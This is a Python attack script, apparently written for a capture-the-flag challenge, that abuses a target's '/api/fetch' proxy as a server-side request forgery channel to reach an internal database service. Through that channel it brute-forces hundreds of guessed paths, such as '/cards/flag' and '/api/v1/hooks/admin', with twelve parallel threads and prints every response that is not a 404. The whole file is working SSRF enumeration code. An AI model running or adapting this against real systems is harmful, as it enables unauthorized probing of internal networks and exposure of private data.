import urllib.request, urllib.error, json, concurrent.futures, itertools, sys
BASE='https://<host>/fireburned-2'
STORE='http://fireburned--db:8080'
def fetch(path, method='GET', body=None, headers=None):
    obj={'url':STORE+path}
    if method!='GET': obj['method']=method
    if body is not None: obj['body']=body
    data=json.dumps(obj).encode()
    r=urllib.request.Request(BASE+'/api/fetch',data=data,headers={'Content-Type':'application/json','User-Agent':'Mozilla/5.0'},method='POST')
    try:
        resp=urllib.request.urlopen(r,timeout=15); b=resp.read()
        j=json.loads(b)
        return (j.get('upstream_status'), j.get('body'))
    except urllib.error.HTTPError as e:
        try: return ('HTTP'+str(e.code), e.read()[:200].decode('latin1'))
        except: return ('HTTP'+str(e.code),'')
    except Exception as e:
        return ('ERR', str(e)[:100])

def check(path):
    st,b=fetch(path)
    if st!=404:
        return (path,st,b)
    return None

cols=['cards','card','drafts','draft','documents','document','hooks','hook','webhooks','webhook','templates','template','previews','preview','notifications','notification','store','data','items','records','entries','messages','mail','emails','notes','posts','objects','resources','collections']
ids=['','1','2','3','0','5','10','100','101','102','1337','default','demo','welcome','card1','draft1','test','example','admin','flag','ember','emberhook','emberhook-cards','notification','preview','sample','main','home']
paths=[]
for c in cols:
    paths.append('/'+c)
    for i in ids:
        if i: paths.append('/%s/%s'%(c,i))
# api/v1 variants
for pre in ['/api','/api/v1','/v1','/v1beta1','/store','/emberhook-cards']:
    for c in ['cards','drafts','documents','hooks','templates','previews']:
        paths.append(pre+'/'+c)
        for i in ['1','default','welcome','flag']:
            paths.append(pre+'/'+c+'/'+i)
# unique
paths=list(dict.fromkeys(paths))
print('testing',len(paths),'paths')
res=[]
with concurrent.futures.ThreadPoolExecutor(max_workers=12) as ex:
    for r in ex.map(check, paths):
        if r:
            res.append(r); print('HIT',r[0],r[1],str(r[2])[:200])
print('done hits',len(res))
